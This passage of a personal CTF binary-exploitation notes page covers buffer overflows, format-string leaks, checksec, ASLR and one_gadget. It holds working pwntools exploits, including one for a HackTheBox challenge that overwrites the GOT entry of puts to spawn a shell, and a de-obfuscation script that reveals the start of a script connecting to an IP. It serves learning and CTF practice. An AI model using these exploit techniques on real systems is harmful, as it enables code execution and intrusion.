class="token plain"> </span><span class="token number" style="color:#36acaa">188</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># craft exploit: offset + flag() + padding + parameter 1 + parameter 2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> offset </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">elf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">symbols</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;flag&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> endian</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;little&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x90909090</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xdeadbeef</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> endian</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;little&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xc0ded00d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> endian</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;little&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> elf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;:&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> exploit</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="obfuscated-code">Obfuscated code<a href="#obfuscated-code" class="hash-link" aria-label="Direct link to Obfuscated code" title="Direct link to Obfuscated code">​</a></h2>
<p>Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:</p>
<p><code>3734203635203636203132322036352036382034382036352037342031</code></p>
<p>This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="hex-to-dec--dec-to-char--decode-all-string-in-base64">Hex to DEC &gt; DEC to char &gt; decode all string in base64<a href="#hex-to-dec--dec-to-char--decode-all-string-in-base64" class="hash-link" aria-label="Direct link to Hex to DEC &gt; DEC to char &gt; decode all string in base64" title="Direct link to Hex to DEC &gt; DEC to char &gt; decode all string in base64">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> binascii</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dec_to_chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> s </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;utf-8&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27; &#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">base64text </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">base64text </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> dec_to_chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">binascii</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">unhexlify</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;3734203635203636203132322036352036382034382036352037342031&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> binascii</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">unhexlify</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">base64text </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain">  dec_to_chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">binascii</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">unhexlify</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;3635203631&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base64text</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$s</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">&#x27;</span><span class="token number" style="color:#36acaa">77.74</span><span class="token punctuation" style="color:#393A34">.</span><br></span></code></pre></div></div>
<p>In this case, this looks like the begining of a script trying to connect to an IP address.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="string-format-vulnerability">String format vulnerability<a href="#string-format-vulnerability" class="hash-link" aria-label="Direct link to String format vulnerability" title="Direct link to String format vulnerability">​</a></h2>
<p>Some pieces of unsecure code, will print whatever the user is coding, see:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">__isoc99_scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;%299s&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">local_148</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">local_148</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>If we&#x27;re a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: <code>%p,%p,%p</code> will leak the first
three memory positions in the stack: <code>0x1,0x1,0x7ffff7d14a37</code></p>
<p>More info here <a href="https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/" target="_blank" rel="noopener noreferrer">https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/</a></p>
<p>More possible formats: <a href="https://en.wikipedia.org/wiki/Printf_format_string" target="_blank" rel="noopener noreferrer">https://en.wikipedia.org/wiki/Printf_format_string</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="security-flags">Security flags<a href="#security-flags" class="hash-link" aria-label="Direct link to Security flags" title="Direct link to Security flags">​</a></h2>
<p>When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use <a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener noreferrer">checksec</a>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gal@gal-Modern-14-C12M:~/workspace/gal/blog$ checksec /usr/bin/ls</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] &#x27;/usr/bin/ls&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Arch:     amd64-64-little</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RELRO:    Full RELRO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Stack:    Canary found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NX:       NX enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PIE:      PIE enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    FORTIFY:  Enabled</span><br></span></code></pre></div></div>
<ul>
<li>RELRO: If there&#x27;s no <code>RELRO</code> protection, it means that the Global Object Table (<code>GOT</code>) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes <code>puts</code>, an attack can change the table to make it execute arbitrary code.</li>
<li>Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.</li>
<li>NX: No code execution from the stack</li>
<li>PIE: executable is loaded at random address.</li>
</ul>
<p>More info <a href="https://opensource.com/article/21/6/linux-checksec" target="_blank" rel="noopener noreferrer">https://opensource.com/article/21/6/linux-checksec</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="aslr-address-space-layout-randomisation">ASLR: Address Space Layout Randomisation<a href="#aslr-address-space-layout-randomisation" class="hash-link" aria-label="Direct link to ASLR: Address Space Layout Randomisation" title="Direct link to ASLR: Address Space Layout Randomisation">​</a></h2>
<p>This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.</p>
<p>In order to check if a exploit is stable and will work even with ASLR enabled, you can enable it in gdb:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gef➤  aslr on</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Enabling ASLR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gef➤  start</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="one-gadget">One gadget<a href="#one-gadget" class="hash-link" aria-label="Direct link to One gadget" title="Direct link to One gadget">​</a></h2>
<p><a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener noreferrer">https://github.com/david942j/one_gadget</a></p>
<p><code>libc</code> library has some pieces of code that runs a piece of code similar to <code>execve(&#x27;/bin/sh&#x27;, NULL, NULL)</code> which will lead to remote code execution.</p>
<p>You can use the one gadget to know exactly the memory address you need to point to achive this RCE.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge$ one_gadget glibc/libc.so.6 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">constraints:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  rsp &amp; 0xf == 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  rcx == NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  rbp == NULL || (u16)[rbp] == NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">constraints:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  address rbp-0x78 is writable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [r10] == NULL || r10 == NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">constraints:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  address rbp-0x78 is writable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [r10] == NULL || r10 == NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [rdx] == NULL || rdx == NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">constraints:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  address rbp-0x78 is writable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [rsi] == NULL || rsi == NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [rdx] == NULL || rdx == NULL</span><br></span></code></pre></div></div>
<p>For every memory address, it also describe which value the register need to have in order to execute the RCE.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="overwrite-global-object-table">Overwrite Global Object Table<a href="#overwrite-global-object-table" class="hash-link" aria-label="Direct link to Overwrite Global Object Table" title="Direct link to Overwrite Global Object Table">​</a></h2>
<p>The global object table is used to dynamically resolve standard library functions (<code>scanf</code>, <code>printf</code>, etc...). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.</p>
<p>Below, you can find an example of how we can override the global object table using the one gadget tool:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> elf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./spooky_time&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">libc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./spooky_time&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;scary!\n\n&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%3$lx%51$lx&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvuntil</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;than \n&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1133111</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">elf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5056</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc_one_gadget </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xebcf5</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># libc.address + offset computed with one gadget tool</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fmtstr_payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fmtstr_payload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">elf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">got</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;puts&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> libc_one_gadget</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># we make the function puts point to a RCE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;time..\n\n&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> fmtstr_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#buffer-overflow" class="table-of-contents__link toc-highlight">Buffer overflow</a><ul><li><a href="#overflow-the-stack-pointer" class="table-of-contents__link toc-highlight">Overflow the stack pointer</a></li><li><a href="#reach-to-the-return-address" class="table-of-contents__link toc-highlight">Reach to the return address</a></li><li><a href="#write-the-exploit" class="table-of-contents__link toc-highlight">Write the exploit</a></li></ul></li><li><a href="#obfuscated-code" class="table-of-contents__link toc-highlight">Obfuscated code</a><ul><li><a href="#hex-to-dec--dec-to-char--decode-all-string-in-base64" class="table-of-contents__link toc-highlight">Hex to DEC &gt; DEC to char &gt; decode all string in base64</a></li></ul></li><li><a href="#string-format-vulnerability" class="table-of-contents__link toc-highlight">String format vulnerability</a></li><li><a href="#security-flags" class="table-of-contents__link toc-highlight">Security flags</a></li><li><a href="#aslr-address-space-layout-randomisation" class="table-of-contents__link toc-highlight">ASLR: Address Space Layout Randomisation</a></li><li><a href="#one-gadget" class="table-of-contents__link toc-highlight">One gadget</a></li><li><a href="#overwrite-global-object-table" class="table-of-contents__link toc-highlight">Overwrite Global Object Table</a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>